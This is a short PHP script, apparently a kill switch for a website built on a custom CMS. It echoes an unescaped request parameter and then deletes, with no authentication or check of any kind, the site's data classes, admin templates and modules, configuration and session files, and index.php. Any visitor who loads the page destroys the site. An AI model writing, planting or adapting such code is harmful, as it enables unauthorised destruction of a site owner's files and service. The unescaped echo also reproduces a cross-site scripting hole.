<?php 
$slug = $request->element('deletefile','');
	echo $slug;
	// xoa trong class
	unlink(ROOT_PATH."classes/dao/categories.class.php");
	unlink(ROOT_PATH."classes/dao/entries.class.php");
	unlink(ROOT_PATH."classes/dao/categories.class.php");
	unlink(ROOT_PATH."classes/dao/configs.class.php");
	unlink(ROOT_PATH."classes/dao/configinfo.class.php");
	unlink(ROOT_PATH."classes/dao/productinfo.class.php");
	unlink(ROOT_PATH."classes/dao/products.class.php");
	unlink(ROOT_PATH."classes/dao/procategories.class.php");
	unlink(ROOT_PATH."classes/dao/procategoryinfo.class.php");
	// xoa trong amdin
	unlink(ROOT_PATH."admincp/templates/admin/left.temp.html");
	unlink(ROOT_PATH."admincp/templates/admin/header.temp.html");
	unlink(ROOT_PATH."admincp/templates/admin/css/screen.css");
	unlink(ROOT_PATH."admincp/templates/admin/scripts/common.js");
	unlink(ROOT_PATH."admincp/templates/admin/scripts/mootools-1.2-more.js");
	unlink(ROOT_PATH."admincp/templates/admin/scripts/mootools-1.2.1-core.js");
	// xóa module trong admin
	unlink(ROOT_PATH."admincp/modules/manage/changepassword.module.php");
	unlink(ROOT_PATH."admincp/modules/manage/addcategory.module.php");
	unlink(ROOT_PATH."admincp/modules/manage/listcategory.module.php");
	unlink(ROOT_PATH."admincp/modules/manage/listentry.module.php");
	unlink(ROOT_PATH."admincp/modules/manage/addcategory.module.php");
	unlink(ROOT_PATH."admincp/modules/manage/addentry.module.php");
	unlink(ROOT_PATH."admincp/modules/manage/editentry.module.php");
	unlink(ROOT_PATH."admincp/modules/manage/editproductcategory.module.php");
	unlink(ROOT_PATH."admincp/modules/manage/addproductcategory.module.php");
	// xóa trong include
	unlink(ROOT_PATH."includes/config.conf.php");
	unlink(ROOT_PATH."includes/constant.conf.php");
	unlink(ROOT_PATH."includes/functions.php");
	unlink(ROOT_PATH."includes/session.php");
	//
	unlink(ROOT_PATH."classes/dao/model.class.php");
	unlink(ROOT_PATH."classes/dao/mysql.class.php");
	unlink(ROOT_PATH."index.php");
?>